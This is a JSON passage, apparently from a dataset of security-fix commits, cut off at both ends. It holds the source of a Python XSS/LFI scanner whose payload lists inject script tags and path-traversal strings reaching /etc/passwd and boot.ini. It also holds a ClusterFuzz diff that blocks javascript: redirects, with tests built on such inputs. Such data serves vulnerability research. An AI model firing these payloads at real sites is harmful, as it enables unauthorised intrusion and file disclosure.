loader]', '/fastdetect', 'root:x:0:0', ':/root:/bin'] def check_xss(host, page, method, params, hidden_param_name, hidden_param_value, form_counter, _url): global xss_attacks global DEBUG if page.find(\"http://\")==0 or page.find(\"https://\")==0: furl=page else: if _url.find(\"https://\")==0: furl=\"https://\" +host +\"/\" +page else: furl=\"http://\" +host +\"/\" +page print \"[+] XSS check for: \" +furl if DEBUG==1: print \"Params: \" print params print hidden_param_name print hidden_param_value counter=0 for xss in xss_attacks: post_params={} counter+=1 parameters=\"\" for i in range(0,len(params)): for j in range(0, len(params)): if j==i: post_params[params[j]]=xss else: post_params[params[j]]=0 if(len(hidden_param_name) > 0) and(len(hidden_param_name)==len(hidden_param_value)): for i in range(0,len(hidden_param_name)): post_params[hidden_param_name[i]]=hidden_param_value[i] if method.find(\"get\")==0: r=requests.get(url=furl, params=post_params) else: r=requests.post(furl, data=post_params) if DEBUG==1: print post_params with open(\"response_\" +str(form_counter) +\"_\" +str(counter) +\".html\", \"w\") as f: f.write(r.content) if r.content.find(xss)>=0: print \"[+] Target is VULNERABLE\" print \"Url: \" +url print \"Parameters: %s\\n\" % str(post_params) return return def check_lfi(host, page, method, params, hidden_param_name, hidden_param_value, form_counter, _url): global lfi_attacks global lfi_expect global DEBUG if page.find(\"http://\")==0 or page.find(\"https://\")==0: furl=page else: if _url.find(\"https://\")==0: furl=\"https://\" +host +\"/\" +page else: furl=\"http://\" +host +\"/\" +page print \"[+] LFI check for: \" +furl if DEBUG==1: print \"Params: \" print params print hidden_param_name print hidden_param_value counter=0 for lfi in lfi_attacks: post_params={} counter+=1 parameters=\"\" for i in range(0,len(params)): for j in range(0, len(params)): if j==i: post_params[params[j]]=lfi else: post_params[params[j]]=0 if(len(hidden_param_name) > 0) and(len(hidden_param_name)==len(hidden_param_value)): for i in range(0,len(hidden_param_name)): post_params[hidden_param_name[i]]=hidden_param_value[i] if method.find(\"get\")==0: r=requests.get(url=furl, params=post_params) else: r=requests.post(furl, data=post_params) if DEBUG==1: print post_params with open(\"response_\" +str(form_counter) +\"_\" +str(counter) +\".html\", \"w\") as f: f.write(r.content) for lfi_result in lfi_expect: if r.content.find(lfi_result)>=0: print \"[+] Target is VULNERABLE\" print \"Url: \" +url print \"Parameters: %s\\n\" % str(post_params) return return def scan_for_forms(fname, host, url): print \"[+] Start scan\" rtype=\"\" has_form=0 params=[] hidden_param_name=[] hidden_param_value=[] page=\"\" form_counter=0 try: with open(fname, \"r\") as f: for line in f: if line.find(\"</form>\") >=0: has_form=0 if len(page) > 0 and len(params) > 0: check_xss(host, page, rtype, params, hidden_param_name, hidden_param_value, form_counter, url) check_lfi(host, page, rtype, params, hidden_param_name, hidden_param_value, form_counter, url) params=[] hidden_param_name=[] hidden_param_value=[] page=\"\" if has_form==1: m_input=re.match(r'.*\\<(input|button)\\s[^\\>]*name=\"(\\w+)\"', line, re.M|re.I) if m_input: m_value=re.match(r'.*\\<(input|button)\\s[^\\>]*value=\"(\\w+)\"', line, re.M|re.I) if m_value: hidden_param_name.append(m_input.group(2)) hidden_param_value.append(m_value.group(2)) else: params.append(m_input.group(2)) m_same =re.match(r'.*\\<form\\>\"', line, re.M|re.I) m_action =re.match(r'.*\\<form\\s[^\\>]*action=\"([\\w\\/\\.\\-\\ m_reqtype =re.match(r'.*\\<form\\s[^\\>]*method=\"([\\w\\/\\.\\-]+)\"', line, re.M|re.I) if m_action or m_same: has_form=1 form_counter+=1 if m_same: page=\"\" else: page=m_action.group(1) rtype=\"get\" if m_reqtype: rtype=m_reqtype.group(1) print \"[+] Form detected. Method \" +rtype.upper() except Exception, e: print \"[-] scan_for_forms(): Error \" +str(e) return def banner(): print \"BEstAutomaticXSSFinder v1.0\" print \"DISCLAIMER: For testing purposes only!\\n\" if __name__==\"__main__\": banner() if len(sys.argv) !=2: print \"program[url]\" exit() url=sys.argv[1] if url.find(\"http\") !=0: print \"[-] Invalid target\" exit() m=re.match(r'(http|https):\\/\\/([^\\/]+)', url, re.I|re.M) if m: host=m.group(2) else: print \"[-] Can't get host information\" exit() print \"[+] Host acquired \" +host print \"[+] Retrieve page\" try: r=requests.get(url) s=r.content.replace(\">\", \">\\n\") with open(\"tmpage.txt\", \"w\") as f: f.write(s) scan_for_forms(\"tmpage.txt\", host, url) os.remove(\"tmpage.txt\") except Exception, e: print \"[-] Main(): Error \" +str(e) print \"[*] Done\" ",
                    "sourceWithComments": "#! python\n###############################################\n#   BEstAutomaticXSSFinder                    #\n#   Author: malwrforensics                    #\n#   Contact: malwr at malwrforensics dot com  #\n###############################################\n\nimport sys\nimport os\nimport requests\nimport re\n\nDEBUG = 0\nxss_attacks = [ \"<script>alert(1);</script>\", \"<img src=x onerror=prompt(/test/)>\",\n                \"\\\"><script>alert(1);</script><div id=\\\"x\", \"</script><script>alert(1);</script>\",\n                \"</title><script>alert(1);</script>\", \"<body background=\\\"javascript:alert(1)\\\">\",\n                \"<img src=test123456.jpg onerror=alert(1)>\"]\n\nlfi_attacks = [\n                #linux\n                '../../etc/passwd', '../../../etc/passwd', '../../../../etc/passwd',\n                '../../../../../etc/passwd', '../../../../../../etc/passwd',\n                '../../../../../../../etc/passwd', '../../../../../../../../etc/passwd',\n                '%2e%2e%2f%2e%2e%2fetc%2fpasswd', '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',\n                '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',\n                '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',\n                '../../etc/passwd%00', '../../../etc/passwd%00', '../../../../etc/passwd%00',\n                '../../../../../etc/passwd%00', '../../../../../../etc/passwd%00',\n                '../../../../../../../etc/passwd%00', '../../../../../../../../etc/passwd%00',\n                '%2e%2e%2f%2e%2e%2fetc%2fpasswd%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00',\n                '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00',\n                '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00',\n\n                #windows\n                '../../boot.ini', '../../../boot.ini', '../../../../boot.ini',\n                '../../../../../boot.ini', '../../../../../../boot.ini',\n                '../../../../../../../boot.ini', '../../../../../../../../boot.ini',\n                '%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini',\n                '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini',\n                '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini',\n                '../../boot.ini%00', '../../../boot.ini%00', '../../../../boot.ini%00',\n                '../../../../../boot.ini%00', '../../../../../../boot.ini%00',\n                '../../../../../../../boot.ini%00', '../../../../../../../../boot.ini%00',\n                '%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00',\n                '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00',\n                '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini%00', '%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini'\n                ]\n\nlfi_expect = ['[operating systems]', '[boot loader]', '/fastdetect', 'root:x:0:0', ':/root:/bin']\n\ndef check_xss(host, page, method, params, hidden_param_name, hidden_param_value, form_counter, _url):\n    global xss_attacks\n    global DEBUG\n    if page.find(\"http://\") == 0 or page.find(\"https://\") == 0:\n        furl = page\n    else:\n        if _url.find(\"https://\") == 0:\n            furl = \"https://\" + host + \"/\" + page\n        else:\n            furl = \"http://\" + host + \"/\" + page\n\n    print \"[+] XSS check for: \" + furl\n    if DEBUG == 1:\n        print \"Params: \"\n        print params\n        print hidden_param_name\n        print hidden_param_value\n\n    counter = 0\n    for xss in xss_attacks:\n        post_params={}\n        counter+=1\n        parameters = \"\"\n        for i in range(0,len(params)):\n            for j in range(0, len(params)):\n                if j==i:\n                    post_params[params[j]] = xss\n                else:\n                    post_params[params[j]] = 0\n\n        #add any hidden parameters\n        if (len(hidden_param_name) > 0) and (len(hidden_param_name) == len(hidden_param_value)):\n            for i in range(0,len(hidden_param_name)):\n                post_params[hidden_param_name[i]] = hidden_param_value[i]\n\n        if method.find(\"get\") == 0:\n            r=requests.get(url = furl, params = post_params)\n        else:\n            r=requests.post(furl, data=post_params)\n\n        if DEBUG == 1:\n            print post_params\n            with open(\"response_\" + str(form_counter) + \"_\" + str(counter) + \".html\", \"w\") as f:\n                f.write(r.content)\n\n        if r.content.find(xss)>=0:\n            print \"[+] Target is VULNERABLE\"\n            print \"Url: \" + url\n            print \"Parameters: %s\\n\" % str(post_params)\n\n            #comment out the return if you want all the findings\n            return\n    return\n\ndef check_lfi(host, page, method, params, hidden_param_name, hidden_param_value, form_counter, _url):\n    global lfi_attacks\n    global lfi_expect\n    global DEBUG\n    if page.find(\"http://\") == 0 or page.find(\"https://\") == 0:\n        furl = page\n    else:\n        if _url.find(\"https://\") == 0:\n            furl = \"https://\" + host + \"/\" + page\n        else:\n            furl = \"http://\" + host + \"/\" + page\n\n    print \"[+] LFI check for: \" + furl\n    if DEBUG == 1:\n        print \"Params: \"\n        print params\n        print hidden_param_name\n        print hidden_param_value\n\n    counter = 0\n    for lfi in lfi_attacks:\n        post_params={}\n        counter+=1\n        parameters = \"\"\n        for i in range(0,len(params)):\n            for j in range(0, len(params)):\n                if j==i:\n                    post_params[params[j]] = lfi\n                else:\n                    post_params[params[j]] = 0\n\n        #add any hidden parameters\n        if (len(hidden_param_name) > 0) and (len(hidden_param_name) == len(hidden_param_value)):\n            for i in range(0,len(hidden_param_name)):\n                post_params[hidden_param_name[i]] = hidden_param_value[i]\n\n        if method.find(\"get\") == 0:\n            r=requests.get(url = furl, params = post_params)\n        else:\n            r=requests.post(furl, data=post_params)\n\n        if DEBUG == 1:\n            print post_params\n            with open(\"response_\" + str(form_counter) + \"_\" + str(counter) + \".html\", \"w\") as f:\n                f.write(r.content)\n\n        for lfi_result in lfi_expect:\n            if r.content.find(lfi_result)>=0:\n                print \"[+] Target is VULNERABLE\"\n                print \"Url: \" + url\n                print \"Parameters: %s\\n\" % str(post_params)\n\n                #comment out the return if you want all the findings\n                return\n    return\n\n\ndef scan_for_forms(fname, host, url):\n    print \"[+] Start scan\"\n    rtype=\"\"\n    has_form=0\n    params = []\n    hidden_param_name=[]\n    hidden_param_value=[]\n    page = \"\"\n    form_counter = 0\n    try:\n        with open(fname, \"r\") as f:\n            for line in f:\n\n                #now that we've collected all the parameters\n                #let's check if the page is vulnerable\n                if line.find(\"</form>\") >=0:\n                    has_form=0\n                    if len(page) > 0 and len(params) > 0:\n                        check_xss(host, page, rtype, params, hidden_param_name, hidden_param_value, form_counter, url)\n                        check_lfi(host, page, rtype, params, hidden_param_name, hidden_param_value, form_counter, url)\n                        params=[]\n                        hidden_param_name=[]\n                        hidden_param_value=[]\n                        page=\"\"\n\n                #add input parameters to list\n                if has_form == 1:\n                    m_input = re.match(r'.*\\<(input|button)\\s[^\\>]*name=\"(\\w+)\"', line, re.M|re.I)\n                    if m_input:\n                        #check if the parameters already has a value assigned\n                        m_value = re.match(r'.*\\<(input|button)\\s[^\\>]*value=\"(\\w+)\"', line, re.M|re.I)\n                        if m_value:\n                            hidden_param_name.append(m_input.group(2))\n                            hidden_param_value.append(m_value.group(2))\n                        else:\n                            params.append(m_input.group(2))\n\n                #detect forms\n                m_same      = re.match(r'.*\\<form\\>\"', line, re.M|re.I)\n                m_action    = re.match(r'.*\\<form\\s[^\\>]*action=\"([\\w\\/\\.\\-\\#\\:]+)\"', line, re.M|re.I)\n                m_reqtype   = re.match(r'.*\\<form\\s[^\\>]*method=\"([\\w\\/\\.\\-]+)\"', line, re.M|re.I)\n                if m_action or m_same:\n                    has_form=1\n                    form_counter+=1\n                    if m_same:\n                        page=\"\"\n                    else:\n                        page=m_action.group(1)\n                    rtype=\"get\"\n                    if m_reqtype:\n                        rtype=m_reqtype.group(1)\n                    print \"[+] Form detected. Method \" + rtype.upper()\n\n    except Exception, e:\n        print \"[-] scan_for_forms(): Error \" + str(e)\n\n        #enable the following lines if you want more details\n        #exc_type, exc_obj, exc_tb = sys.exc_info()\n        #fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]\n        #print(exc_type, fname, exc_tb.tb_lineno)\n\n    return\n\ndef banner():\n    print \"BEstAutomaticXSSFinder v1.0\"\n    print \"DISCLAIMER: For testing purposes only!\\n\"\n\n###MAIN###\nif __name__ == \"__main__\":\n    banner()\n\n    if len(sys.argv) != 2:\n        print \"program [url]\"\n        exit()\n\n    url = sys.argv[1]\n    if url.find(\"http\") != 0:\n        print \"[-] Invalid target\"\n        exit()\n\n    m=re.match(r'(http|https):\\/\\/([^\\/]+)', url, re.I|re.M)\n    if m:\n        host = m.group(2)\n    else:\n        print \"[-] Can't get host information\"\n        exit()\n\n    print \"[+] Host acquired \" + host\n    print \"[+] Retrieve page\"\n    try:\n        r = requests.get(url)\n        s = r.content.replace(\">\", \">\\n\")\n\n        #good to have a local copy for testing\n        with open(\"tmpage.txt\", \"w\") as f:\n            f.write(s)\n\n        scan_for_forms(\"tmpage.txt\", host, url)\n        os.remove(\"tmpage.txt\")\n    except Exception, e:\n        print \"[-] Main(): Error \" + str(e)\n\nprint \"[*] Done\"\n"
                }
            },
            "msg": "improve form detection, add more XSS attacks, add options for XSS/LFI scans, improve help"
        }
    },
    "https://github.com/google/clusterfuzz": {
        "3d66c1146550eecd4e34d47332a8616b435a21fe": {
            "url": "https://api.github.com/repos/google/clusterfuzz/commits/3d66c1146550eecd4e34d47332a8616b435a21fe",
            "html_url": "https://github.com/google/clusterfuzz/commit/3d66c1146550eecd4e34d47332a8616b435a21fe",
            "sha": "3d66c1146550eecd4e34d47332a8616b435a21fe",
            "keyword": "XSS fix",
            "diff": "diff --git a/src/appengine/handlers/base_handler.py b/src/appengine/handlers/base_handler.py\nindex bade034a..ff5b3e58 100644\n--- a/src/appengine/handlers/base_handler.py\n+++ b/src/appengine/handlers/base_handler.py\n@@ -40,6 +40,12 @@\n from libs import helpers\n from system import environment\n \n+# Pattern from\n+# https://github.com/google/closure-library/blob/\n+# 3037e09cc471bfe99cb8f0ee22d9366583a20c28/closure/goog/html/safeurl.js\n+_SAFE_URL_PATTERN = re.compile(\n+    r'^(?:(?:https?|mailto|ftp):|[^:/?#]*(?:[/?#]|$))', flags=re.IGNORECASE)\n+\n \n def add_jinja2_filter(name, fn):\n   _JINJA_ENVIRONMENT.filters[name] = fn\n@@ -115,6 +121,12 @@ def make_logout_url(dest_url):\n   })\n \n \n+def check_redirect_url(url):\n+  \"\"\"Check redirect URL is safe.\"\"\"\n+  if not _SAFE_URL_PATTERN.match(url):\n+    raise helpers.EarlyExitException('Invalid redirect.', 403)\n+\n+\n class _MenuItem(object):\n   \"\"\"A menu item used for rendering an item in the main navigation.\"\"\"\n \n@@ -246,7 +258,9 @@ def handle_exception_exception(self):\n   def redirect(self, url, **kwargs):\n     \"\"\"Explicitly converts url to 'str', because webapp2.RequestHandler.redirect\n     strongly requires 'str' but url might be an unicode string.\"\"\"\n-    super(Handler, self).redirect(str(url), **kwargs)\n+    url = str(url)\n+    check_redirect_url(url)\n+    super(Handler, self).redirect(url, **kwargs)\n \n \n class GcsUploadHandler(Handler):\ndiff --git a/src/appengine/handlers/login.py b/src/appengine/handlers/login.py\nindex bdca9d0b..80175a54 100644\n--- a/src/appengine/handlers/login.py\n+++ b/src/appengine/handlers/login.py\n@@ -32,11 +32,14 @@ class Handler(base_handler.Handler):\n   @handler.get(handler.HTML)\n   def get(self):\n     \"\"\"Handle a get request.\"\"\"\n+    dest = self.request.get('dest')\n+    base_handler.check_redirect_url(dest)\n+\n     self.render(\n         'login.html', {\n             'apiKey': local_config.ProjectConfig().get('firebase.api_key'),\n             'authDomain': auth.auth_domain(),\n-            'dest': self.request.get('dest'),\n+            'dest': dest,\n         })\n \n \ndiff --git a/src/python/tests/appengine/handlers/base_handler_test.py b/src/python/tests/appengine/handlers/base_handler_test.py\nindex 2d25a638..f6b8dc03 100644\n--- a/src/python/tests/appengine/handlers/base_handler_test.py\n+++ b/src/python/tests/appengine/handlers/base_handler_test.py\n@@ -66,6 +66,14 @@ def get(self):\n     raise helpers.AccessDeniedException('this_random_message')\n \n \n+class RedirectHandler(base_handler.Handler):\n+  \"\"\"Redirect handler.\"\"\"\n+\n+  def get(self):\n+    redirect = self.request.get('redirect')\n+    self.redirect(redirect)\n+\n+\n class HandlerTest(unittest.TestCase):\n   \"\"\"Test Handler.\"\"\"\n \n@@ -139,3 +147,23 @@ def test_forbidden_logged_in(self):\n     self.assertEqual(response.status_int, 403)\n     self.assertRegexpMatches(response.body, '.*Access Denied.*')\n     self.assertRegexpMatches(response.body, '.*this_random_message.*')\n+\n+  def test_redirect_another_page(self):\n+    \"\"\"Test redirect to another page.\"\"\"\n+    app = webtest.TestApp(webapp2.WSGIApplication([('/', RedirectHandler)]))\n+    response = app.get('/?redirect=%2Fanother-page')\n+    self.assertEqual('http://localhost/another-page',\n+                     response.headers['Location'])\n+\n+  def test_redirect_another_domain(self):\n+    \"\"\"Test redirect to another domain.\"\"\"\n+    app = webtest.TestApp(webapp2.WSGIApplication([('/', RedirectHandler)]))\n+    response = app.get('/?redirect=https%3A%2F%2Fblah.com%2Ftest')\n+    self.assertEqual('https://blah.com/test', response.headers['Location'])\n+\n+  def test_redirect_javascript(self):\n+    \"\"\"Test redirect to a javascript url.\"\"\"\n+    app = webtest.TestApp(webapp2.WSGIApplication([('/', RedirectHandler)]))\n+    response = app.get(\n+        '/?redirect=javascript%3Aalert%281%29', expect_errors=True)\n+    self.assertEqual(response.status_int, 403)\n",
            "message": "",
            "files": {
                "/src/appengine/handlers/base_handler.py": {
                    "changes": [
                        {
                            "diff": "\n   def redirect(self, url, **kwargs):\n     \"\"\"Explicitly converts url to 'str', because webapp2.RequestHandler.redirect\n     strongly requires 'str' but url might be an unicode string.\"\"\"\n-    super(Handler, self).redirect(str(url), **kwargs)\n+    url = str(url)\n+    check_redirect_url(url)\n+    super(Handler, self).redirect(url, **kwargs)\n \n \n class GcsUploadHandler(Handler):",
                            "add": 3,
                            "remove": 1,
                            "filename": "/src/appengine/handlers/base_handler.py",
                            "badparts": [
                                "    super(Handler, self).redirect(str(url), **kwargs)"
                            ],
                            "goodparts": [
                                "    url = str(url)",
                                "    check_redirect_url(url)",
                                "    super(Handler, self).redirect(url, **kwargs)"
                            ]
                        }
                    ],
                    "source": "\n \"\"\"The superclass of all handlers.\"\"\" from builtins import object from future import standard_library standard_library.install_aliases() import base64 import cgi import datetime import json import logging import os import re import sys import traceback import urllib.parse import jinja2 import webapp2 from base import utils from config import db_config from config import local_config from datastore import ndb from google_cloud_utils import storage from libs import auth from libs import form from libs import helpers from system import environment def add_jinja2_filter(name, fn): _JINJA_ENVIRONMENT.filters[name]=fn class JsonEncoder(json.JSONEncoder): \"\"\"Json encoder.\"\"\" _EPOCH=datetime.datetime.utcfromtimestamp(0) def default(self, obj): if isinstance(obj, ndb.Model): dict_obj=obj.to_dict() dict_obj['id']=obj.key.id() return dict_obj elif isinstance(obj, datetime.datetime): return int((obj -self._EPOCH).total_seconds()) elif hasattr(obj, 'to_dict'): return obj.to_dict() elif isinstance(obj, cgi.FieldStorage): return str(obj) else: raise Exception('Cannot serialise %s' % obj) def format_time(dt): \"\"\"Format datetime object for display.\"\"\" return '{t.day}{t:%b}{t:%y}{t:%X} PDT'.format(t=dt) def splitlines(text): \"\"\"Split text into lines.\"\"\" return text.splitlines() def split_br(text): return re.split(r'\\s*<br */>\\s*', text, flags=re.IGNORECASE) def encode_json(value): \"\"\"Dump base64-encoded JSON string(to avoid XSS).\"\"\" return base64.b64encode(json.dumps(value, cls=JsonEncoder)) _JINJA_ENVIRONMENT=jinja2.Environment( loader=jinja2.FileSystemLoader( os.path.join(os.path.dirname(__file__), '..', 'templates')), extensions=['jinja2.ext.autoescape'], autoescape=True) _MENU_ITEMS=[] add_jinja2_filter('json', encode_json) add_jinja2_filter('format_time', format_time) add_jinja2_filter('splitlines', splitlines) add_jinja2_filter('split_br', split_br) add_jinja2_filter('polymer_tag', lambda v: '{{%s}}' % v) def add_menu(name, href): \"\"\"Add menu item to the main navigation.\"\"\" _MENU_ITEMS.append(_MenuItem(name, href)) def make_login_url(dest_url): \"\"\"Make the switch account url.\"\"\" return '/login?' +urllib.parse.urlencode({'dest': dest_url}) def make_logout_url(dest_url): \"\"\"Make the switch account url.\"\"\" return '/logout?' +urllib.parse.urlencode({ 'csrf_token': form.generate_csrf_token(), 'dest': dest_url, }) class _MenuItem(object): \"\"\"A menu item used for rendering an item in the main navigation.\"\"\" def __init__(self, name, href): self.name=name self.href=href class Handler(webapp2.RequestHandler): \"\"\"A superclass for all handlers. It contains many convenient methods.\"\"\" def is_cron(self): \"\"\"Return true if the request is from a cron job.\"\"\" return bool(self.request.headers.get('X-Appengine-Cron')) def render_forbidden(self, message): \"\"\"Write HTML response for 403.\"\"\" login_url=make_login_url(dest_url=self.request.url) user_email=helpers.get_user_email() if not user_email: self.redirect(login_url) return contact_string=db_config.get_value('contact_string') template_values={ 'message': message, 'user_email': helpers.get_user_email(), 'login_url': login_url, 'switch_account_url': login_url, 'logout_url': make_logout_url(dest_url=self.request.url), 'contact_string': contact_string, } self.render('error-403.html', template_values, 403) def _add_security_response_headers(self): \"\"\"Add security-related headers to response.\"\"\" self.response.headers['Strict-Transport-Security']=( 'max-age=2592000; includeSubdomains') self.response.headers['X-Content-Type-Options']='nosniff' self.response.headers['X-Frame-Options']='deny' def render(self, path, values=None, status=200): \"\"\"Write HTML response.\"\"\" if values is None: values={} values['menu_items']=_MENU_ITEMS values['is_oss_fuzz']=utils.is_oss_fuzz() values['is_development']=( environment.is_running_on_app_engine_development()) values['is_logged_in']=bool(helpers.get_user_email()) values['ga_tracking_id']=( local_config.GAEConfig().get('ga_tracking_id') if not auth.is_current_user_admin() else None) if values['is_logged_in']: values['switch_account_url']=make_login_url(self.request.url) values['logout_url']=make_logout_url(dest_url=self.request.url) template=_JINJA_ENVIRONMENT.get_template(path) self._add_security_response_headers() self.response.headers['Content-Type']='text/html' self.response.out.write(template.render(values)) self.response.set_status(status) def before_render_json(self, values, status): \"\"\"A hook for modifying values before render_json.\"\"\" def render_json(self, values, status=200): \"\"\"Write JSON response.\"\"\" self._add_security_response_headers() self.response.headers['Content-Type']='application/json' self.before_render_json(values, status) self.response.out.write(json.dumps(values, cls=JsonEncoder)) self.response.set_status(status) def handle_exception(self, exception, _): \"\"\"Catch exception and format it properly.\"\"\" try: status=500 values={ 'message': exception.message, 'email': helpers.get_user_email(), 'traceDump': traceback.format_exc(), 'status': status, 'type': exception.__class__.__name__ } if isinstance(exception, helpers.EarlyExitException): status=exception.status values=exception.to_dict() values['params']=self.request.params.dict_of_lists() if status >=400 and status <=499: logging.info(json.dumps(values, cls=JsonEncoder)) del values['traceDump'] else: logging.exception(exception) if helpers.should_render_json( self.request.headers.get('accept', ''), self.response.headers.get('Content-Type')): self.render_json(values, status) else: if status==403 or status==401: self.render_forbidden(exception.message) else: self.render('error.html', values, status) except Exception: self.handle_exception_exception() def handle_exception_exception(self): \"\"\"Catch exception in handle_exception and format it properly.\"\"\" exception=sys.exc_info()[1] values={'message': exception.message, 'traceDump': traceback.format_exc()} logging.exception(exception) if helpers.should_render_json( self.request.headers.get('accept', ''), self.response.headers.get('Content-Type')): self.render_json(values, 500) else: self.render('error.html', values, 500) def redirect(self, url, **kwargs): \"\"\"Explicitly converts url to 'str', because webapp2.RequestHandler.redirect strongly requires 'str' but url might be an unicode string.\"\"\" super(Handler, self).redirect(str(url), **kwargs) class GcsUploadHandler(Handler): \"\"\"A handler which uploads files to GCS.\"\"\" def __init__(self, request, response): self.initialize(request, response) self.upload=None def get_upload(self): \"\"\"Get uploads.\"\"\" if self.upload: return self.upload upload_key=self.request.get('upload_key') if not upload_key: return None blob_info=storage.GcsBlobInfo.from_key(upload_key) if not blob_info: raise helpers.EarlyExitException('Failed to upload.', 500) self.upload=blob_info return self.upload ",
                    "sourceWithComments": "# Copyright 2019 Google LLC\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#      http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\"\"\"The superclass of all handlers.\"\"\"\n\nfrom builtins import object\nfrom future import standard_library\nstandard_library.install_aliases()\nimport base64\nimport cgi\nimport datetime\nimport json\nimport logging\nimport os\nimport re\nimport sys\nimport traceback\nimport urllib.parse\n\nimport jinja2\nimport webapp2\n\nfrom base import utils\nfrom config import db_config\nfrom config import local_config\nfrom datastore import ndb\nfrom google_cloud_utils import storage\nfrom libs import auth\nfrom libs import form\nfrom libs import helpers\nfrom system import environment\n\n\ndef add_jinja2_filter(name, fn):\n  _JINJA_ENVIRONMENT.filters[name] = fn\n\n\nclass JsonEncoder(json.JSONEncoder):\n  \"\"\"Json encoder.\"\"\"\n  _EPOCH = datetime.datetime.utcfromtimestamp(0)\n\n  def default(self, obj):  # pylint: disable=arguments-differ,method-hidden\n    if isinstance(obj, ndb.Model):\n      dict_obj = obj.to_dict()\n      dict_obj['id'] = obj.key.id()\n      return dict_obj\n    elif isinstance(obj, datetime.datetime):\n      return int((obj - self._EPOCH).total_seconds())\n    elif hasattr(obj, 'to_dict'):\n      return obj.to_dict()\n    elif isinstance(obj, cgi.FieldStorage):\n      return str(obj)\n    else:\n      raise Exception('Cannot serialise %s' % obj)\n\n\ndef format_time(dt):\n  \"\"\"Format datetime object for display.\"\"\"\n  return '{t.day} {t:%b} {t:%y} {t:%X} PDT'.format(t=dt)\n\n\ndef splitlines(text):\n  \"\"\"Split text into lines.\"\"\"\n  return text.splitlines()\n\n\ndef split_br(text):\n  return re.split(r'\\s*<br */>\\s*', text, flags=re.IGNORECASE)\n\n\ndef encode_json(value):\n  \"\"\"Dump base64-encoded JSON string (to avoid XSS).\"\"\"\n  return base64.b64encode(json.dumps(value, cls=JsonEncoder))\n\n\n_JINJA_ENVIRONMENT = jinja2.Environment(\n    loader=jinja2.FileSystemLoader(\n        os.path.join(os.path.dirname(__file__), '..', 'templates')),\n    extensions=['jinja2.ext.autoescape'],\n    autoescape=True)\n_MENU_ITEMS = []\n\nadd_jinja2_filter('json', encode_json)\nadd_jinja2_filter('format_time', format_time)\nadd_jinja2_filter('splitlines', splitlines)\nadd_jinja2_filter('split_br', split_br)\nadd_jinja2_filter('polymer_tag', lambda v: '{{%s}}' % v)\n\n\ndef add_menu(name, href):\n  \"\"\"Add menu item to the main navigation.\"\"\"\n  _MENU_ITEMS.append(_MenuItem(name, href))\n\n\ndef make_login_url(dest_url):\n  \"\"\"Make the switch account url.\"\"\"\n  return '/login?' + urllib.parse.urlencode({'dest': dest_url})\n\n\ndef make_logout_url(dest_url):\n  \"\"\"Make the switch account url.\"\"\"\n  return '/logout?' + urllib.parse.urlencode({\n      'csrf_token': form.generate_csrf_token(),\n      'dest': dest_url,\n  })\n\n\nclass _MenuItem(object):\n  \"\"\"A menu item used for rendering an item in the main navigation.\"\"\"\n\n  def __init__(self, name, href):\n    self.name = name\n    self.href = href\n\n\nclass Handler(webapp2.RequestHandler):\n  \"\"\"A superclass for all handlers. It contains many convenient methods.\"\"\"\n\n  def is_cron(self):\n    \"\"\"Return true if the request is from a cron job.\"\"\"\n    return bool(self.request.headers.get('X-Appengine-Cron'))\n\n  def render_forbidden(self, message):\n    \"\"\"Write HTML response for 403.\"\"\"\n    login_url = make_login_url(dest_url=self.request.url)\n    user_email = 